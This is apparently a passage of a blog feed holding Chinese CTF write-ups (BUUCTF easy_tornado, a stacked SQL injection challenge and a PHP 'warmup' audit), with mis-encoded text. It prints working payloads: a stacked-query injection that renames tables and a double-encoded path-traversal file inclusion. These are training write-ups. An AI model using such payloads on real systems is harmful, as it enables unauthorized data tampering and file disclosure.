class="hljs-string">'/fllllllllllllag'</span><br>    cookie_secret=<span class="hljs-string">'c9c4e7d6-252c-47f9-a4d2-c2d67afcd4b7'</span><br>    print(md5(cookie_secret+md5(filename)))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    main()<br></code></pre></td></tr></tbody></table></figure><p>æœ€åçš„filehashä¸º</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">16a4ec873339e7847bf28e0e0b33803e<br></code></pre></td></tr></tbody></table></figure><p>ç„¶åæ„é€ payloadä¸º</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/file?filename=/fllllllllllllag&filehash=16a4ec873339e7847bf28e0e0b33803e<br></code></pre></td></tr></tbody></table></figure><p>å¾—åˆ°flag<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/6.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> æ¨¡æ¿æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF å¼ºç½‘æ¯-éšä¾¿æ³¨</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒï¼Œçœ‹åˆ°è¿™æ ·çš„é¡µé¢<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/1.jpg" alt=""></p><a id="more"></a><p>åŠ â€™å¼•å·æµ‹è¯•<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/2.jpg" alt=""><br>æŠ¥é”™<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/3.jpg" alt=""><br>åŠ æ³¨é‡Š<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/4.jpg" alt=""><br>æ¢å¤æ­£å¸¸ï¼Œæ‰€ä»¥å¯ä»¥åˆ¤æ–­æ˜¯å•å¼•å·çš„æ³¨å…¥</p><p>ä¹‹åå¼€å§‹åˆ¤æ–­åˆ—æ•°<br>order byæµ‹è¯•åˆ°3çš„æ—¶å€™æŠ¥é”™<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/5.jpg" alt=""><br>æ‰€ä»¥ä¸€å…±æœ‰ä¸¤åˆ—<br>åˆ¤æ–­å®Œåˆ—æ•°ï¼Œå¼€å§‹unionæ³¨å…¥ï¼Œä½†å›æ˜¾å‘Šè¯‰æˆ‘ä»¬è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/6.jpg" alt=""><br>ä¹‹åå°è¯•äº†è®¸å¤šæ–¹æ³•æƒ³è¦ç»•è¿‡ï¼Œä½†éƒ½æ²¡æœ‰ä»€ä¹ˆæ•ˆæœ<br>ç„¶åå°±æ˜¯å­¦åˆ°çš„æ–°ä¸œè¥¿äº†ï¼Œå †å æ³¨å…¥<br>é¦–å…ˆç”¨show databases;çˆ†åº“<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/7.jpg" alt=""><br>ç„¶åshow tables;æŠ¥è¡¨<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/8.jpg" alt=""><br>å¯ä»¥çœ‹åˆ°ä¸€å…±æœ‰ä¸¤ä¸ªè¡¨<br>wordså’Œ1919810931114514<br>ç„¶åæŸ¥è¯¢wordsè¡¨é‡Œæ‰€æœ‰çš„åˆ—</p><figure class="hljs highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs sql">1';<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword"><code class="language-hljs sql">1';<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> words;<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/9.jpg" alt=""><br>wordsè¡¨é‡Œä¸€å…±ä¸¤åˆ—ï¼Œidå’Œdataï¼Œç»“åˆæˆ‘ä»¬ç”¨1æŸ¥è¯¢å‡ºæ¥çš„ç»“æœï¼Œä¹Ÿæ˜¯ä¸€ä¸ªåºå·ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åŸºæœ¬ç¡®å®šæˆ‘ä»¬å½“å‰æ‰€åœ¨çš„è¡¨å°±æ˜¯wordsè¡¨<br>å†æŸ¥è¯¢1919810931114514è¡¨çš„åˆ—</p><figure class="hljs highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs sql">1';<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> <span class="hljs-string"><code class="language-hljs sql">1';<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> <span class="hljs-string">`1919810931114514`</span>;(çº¯æ•°å­—éœ€è¦ç”¨åå¼•å·æ‹¬èµ·æ¥)<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/10.jpg" alt=""><br>å¯ä»¥çœ‹åˆ°è¿™ä¸ªè¡¨é‡Œé¢æœ‰æˆ‘ä»¬éœ€è¦çš„flag<br>é‚£ä¹ˆè¯¥å¦‚ä½•è·å–flagå‘¢</p><p>æˆ‘ä»¬å¯ä»¥å°†wordsè¡¨æ”¹æˆå¦å¤–ä¸€ä¸ªåå­—ï¼Œç„¶åå°†1919810931114514è¡¨æ”¹ä¸ºwordsï¼Œè¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬åªéœ€è¦æŸ¥è¯¢wordsè¡¨å°±èƒ½å¾—åˆ°flag<br>payloadå¦‚ä¸‹</p><figure class="hljs highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs sql">http://417fcd6d-dfd6-4e25-a790-5178dd3c699b.node3.buuoj.cn/?inject=1%27;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">rename</span> <span class="hljs-keyword">to</span> word;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-string">`1919810931114514`</span> <span class="hljs-keyword">rename</span> <span class="hljs-keyword">to</span> words;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">change</span> flag <span class="hljs-keyword">data</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">100</span>);<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">add</span> <span class="hljs-keyword">column</span> <span class="hljs-keyword">id</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">10</span>)<span class="hljs-comment"><code class="language-hljs sql">http://417fcd6d-dfd6-4e25-a790-5178dd3c699b.node3.buuoj.cn/?inject=1%27;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">rename</span> <span class="hljs-keyword">to</span> word;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-string">`1919810931114514`</span> <span class="hljs-keyword">rename</span> <span class="hljs-keyword">to</span> words;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">change</span> flag <span class="hljs-keyword">data</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">100</span>);<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">add</span> <span class="hljs-keyword">column</span> <span class="hljs-keyword">id</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">10</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></tbody></table></figure><p>æ³¨ï¼šè¿™é‡Œè¦æ³¨æ„å‡ ä¸ªé—®é¢˜ï¼š</p><pre><code>å¯¹åˆ—åè¿›è¡Œæ›´æ”¹æ—¶ï¼Œè¦åœ¨åé¢æŒ‡å®šä¿®æ”¹åçš„æ•°æ®ç±»å‹æ·»åŠ idåˆ—æ—¶ï¼Œè®¾ç½®é»˜è®¤å€¼ï¼Œæ–¹ä¾¿åé¢æŸ¥è¯¢</code></pre><p>æ‰§è¡Œå®Œpayloadåï¼Œç„¶åå†æŸ¥è¯¢1â€™ and â€˜1â€™=â€™1å°±å¯ä»¥å¾—åˆ°flag<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/11.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å †å æ³¨å…¥ </tag>
            
            <tag> ä¿®æ”¹è¡¨åå’Œåˆ— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF warmup</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-warmup/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-warmup/</url>
      
        <content type="html"><![CDATA[<p>ä»£ç å®¡è®¡é¢˜ç›®<br>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æç¤º</p><figure class="hljs highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre class=" language-hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--source.php--&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name"><code class="language-hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--source.php--&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>></span><br></code></pre></td></tr></tbody></table></figure><p>è®¿é—®source.php</p><a id="more"></a><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre class=" language-hljs php"><span class="hljs-meta">&lt;?php</span><br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span><br>    </span>{<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span><span class="hljs-params">(&amp;$page)</span><br>        </span>{<br>            $whitelist = [<span class="hljs-string">"source"</span>=&gt;<span class="hljs-string">"source.php"</span>,<span class="hljs-string">"hint"</span>=&gt;<span class="hljs-string">"hint.php"</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>($page) || !is_string($page)) {<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">"you can't see it"</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            }<br>            <span class="hljs-keyword">if</span> (in_array($page, $whitelist)) {<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            }<br>            $_page = mb_substr(<br>                $page,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos($page . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) {<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            }<br>            $_page = urldecode($page);<br>            $_page = mb_substr(<br>                $_page,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos($_page . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) {<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            }<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"you can't see it"</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        }<br>    }<br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>($_REQUEST[<span class="hljs-string">'file'</span>])<br>        &amp;&amp; is_string($_REQUEST[<span class="hljs-string">'file'</span>])<br>        &amp;&amp; emmm::checkFile($_REQUEST[<span class="hljs-string">'file'</span>])<br>    ) {<br>        <span class="hljs-keyword">include</span> $_REQUEST[<span class="hljs-string">'file'</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;<br>    }  <br><span class="hljs-meta"><code class="language-hljs php"><span class="hljs-meta">&lt;?php</span><br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span><br>    </span>{<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span><span class="hljs-params">(&amp;$page)</span><br>        </span>{<br>            $whitelist = [<span class="hljs-string">"source"</span>=&gt;<span class="hljs-string">"source.php"</span>,<span class="hljs-string">"hint"</span>=&gt;<span class="hljs-string">"hint.php"</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>($page) || !is_string($page)) {<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">"you can't see it"</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            }<br>            <span class="hljs-keyword">if</span> (in_array($page, $whitelist)) {<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            }<br>            $_page = mb_substr(<br>                $page,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos($page . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) {<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            }<br>            $_page = urldecode($page);<br>            $_page = mb_substr(<br>                $_page,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos($_page . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) {<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            }<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"you can't see it"</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        }<br>    }<br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>($_REQUEST[<span class="hljs-string">'file'</span>])<br>        &amp;&amp; is_string($_REQUEST[<span class="hljs-string">'file'</span>])<br>        &amp;&amp; emmm::checkFile($_REQUEST[<span class="hljs-string">'file'</span>])<br>    ) {<br>        <span class="hljs-keyword">include</span> $_REQUEST[<span class="hljs-string">'file'</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;<br>    }  <br><span class="hljs-meta">?></span><br></code></pre></td></tr></tbody></table></figure><p>ä»£ç å®¡è®¡<br>æœ‰ä¸€ä¸ªcheckFileæ–¹æ³•ï¼Œè§„å®šäº†ç™½åå•</p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs php">$whitelist = [<span class="hljs-string">"source"</span>=&gt;<span class="hljs-string">"source.php"</span>,<span class="hljs-string">"hint"</span>=&gt;<span class="hljs-string"><code class="language-hljs php">$whitelist = [<span class="hljs-string">"source"</span>=&gt;<span class="hljs-string">"source.php"</span>,<span class="hljs-string">"hint"</span>=&gt;<span class="hljs-string">"hint.php"</span>];<br></code></pre></td></tr></tbody></table></figure><p>ç™½åå•å†…æœ‰ä¸€ä¸ªhint.phpï¼Œè®¿é—®ä¸€ä¸‹</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash">flag not here, and flag <span class="hljs-keyword"><code class="language-hljs bash">flag not here, and flag <span class="hljs-keyword">in</span> ffffllllaaaagggg<br></code></pre></td></tr></tbody></table></figure><p>å¾—åˆ°è¿™æ ·çš„æç¤ºï¼Œå†ç»§ç»­å®¡è®¡ä»£ç </p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs php"><span class="hljs-keyword">if</span> (! <span class="hljs-keyword"><code class="language-hljs php"><span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>($page) || !is_string($page))<br></code></pre></td></tr></tbody></table></figure><p>éœ€è¦è®¾å®špageå‚æ•°å¹¶ä¸”pageè¦æ˜¯å­—ç¬¦</p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs php">$_page = mb_substr(<br>                $page,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos($page . <span class="hljs-string">'?'</span>, <span class="hljs-string"><code class="language-hljs php">$_page = mb_substr(<br>                $page,<br>                <span class="hljs-number">0</span>,<br>                mb_strpos($page . <span class="hljs-string">'?'</span>, <span class="hljs-string">'?'</span>)<br>            );<br></code></pre></td></tr></tbody></table></figure><p>mb_substræ˜¯æˆªå–å­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œmb_strposå‡½æ•°åˆ™æ‰¾å‡ºå­—ç¬¦ç¬¬ä¸€æ¬¡å‡ºç°çš„åœ°æ–¹<br>æ‰€ä»¥ä¸Šé¢ä»£ç çš„ä½œç”¨å°±æ˜¯ï¼Œæˆªå–pageåˆ°ï¼Ÿç¬¬ä¸€æ¬¡å‡ºç°çš„åœ°æ–¹</p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs php"><span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) {<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword"><code class="language-hljs php"><span class="hljs-keyword">if</span> (in_array($_page, $whitelist)) {<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            }<br></code></pre></td></tr></tbody></table></figure><p>å¦‚æœæˆªå–ä¹‹åçš„_pageåœ¨ç™½åå•å†…åˆ™è¿”å›çœŸ<br>ç¬¬ä¸€æ¬¡æˆªå–ä¹‹åå†å¯¹pageè¿›è¡Œä¸€æ¬¡urlè§£ç </p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs php"><code class="language-hljs php">$_page = urldecode($page);<br></code></pre></td></tr></tbody></table></figure><p>è§£ç ä¹‹ååœ¨å¯¹å…¶è¿›è¡ŒåŒæ ·çš„æˆªå–æ“ä½œ<br>åŒæ ·çš„ï¼Œå¦‚æœæˆªå–åˆ°çš„_pageåœ¨ç™½åå•å†…åˆ™è¿”å›çœŸ</p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre class=" language-hljs php"><span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>($_REQUEST[<span class="hljs-string">'file'</span>])<br>        &amp;&amp; is_string($_REQUEST[<span class="hljs-string">'file'</span>])<br>        &amp;&amp; emmm::checkFile($_REQUEST[<span class="hljs-string">'file'</span>])<br>    ) {<br>        <span class="hljs-keyword">include</span> $_REQUEST[<span class="hljs-string">'file'</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string"><code class="language-hljs php"><span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>($_REQUEST[<span class="hljs-string">'file'</span>])<br>        &amp;&amp; is_string($_REQUEST[<span class="hljs-string">'file'</span>])<br>        &amp;&amp; emmm::checkFile($_REQUEST[<span class="hljs-string">'file'</span>])<br>    ) {<br>        <span class="hljs-keyword">include</span> $_REQUEST[<span class="hljs-string">'file'</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span>;<br>    }<br></code></pre></td></tr></tbody></table></figure><p>è¿™ä¸€å—ä»£ç çš„å«ä¹‰æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬è®¾å®šäº†fileå‚æ•°ï¼Œå¹¶ä¸”æ»¡è¶³fileå‚æ•°æ˜¯å­—ç¬¦ä¸²å’Œcheckfileæ–¹æ³•ï¼Œå°±è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œå¦åˆ™å°±è¿”å›ä¸€å¼€å§‹æˆ‘ä»¬è§åˆ°çš„é‚£ä¸ªæ»‘ç¨½<br>å®¡è®¡å®Œäº†ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦ç†æ¸…æ€è·¯<br>1.flagåœ¨ffffllllaaaaggggé‡Œé¢<br>2.æˆ‘ä»¬çš„fileè¦æœ‰ç™½åå•å†…çš„æ–‡ä»¶<br>3.ä¸¤æ¬¡è§£ç (æœåŠ¡å™¨æœ¬èº«å°±ä¼šè¿›è¡Œä¸€æ¬¡urlè§£ç ï¼Œåç«¯åˆè¿›è¡Œä¸€æ¬¡è§£ç )åä¾ç„¶è¦æ»¡è¶³checkfileæ–¹æ³•<br>åŸºäºè¿™äº›è¦æ±‚ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿé€ å‡ºpayload</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">http://2bd8af98-1fcf-46ca-9780-c09e216ffb5e.node3.buuoj.cn/?file=source.php%253f../../../../../../../../../../../../../../../../../ffffllllaaaagggg<br></code></pre></td></tr></tbody></table></figure><p>?ç»è¿‡ä¸¤æ¬¡urlç¼–ç ä¹‹åæ˜¯%253fï¼Œåé¢çš„../æ˜¯ç”¨æ¥è¿›è¡Œç›®å½•ç©¿è¶Šçš„<br>è®¿é—®ä¸€ä¸‹å°±èƒ½å¾—åˆ°flag<br>flag{540b1ff4-daf1-472a-8d21-0a0c9a36884b} </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>about</title>
      <link href="/LawlietLW.github.io/about/index.html"/>
      <url>/LawlietLW.github.io/about/index.html</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
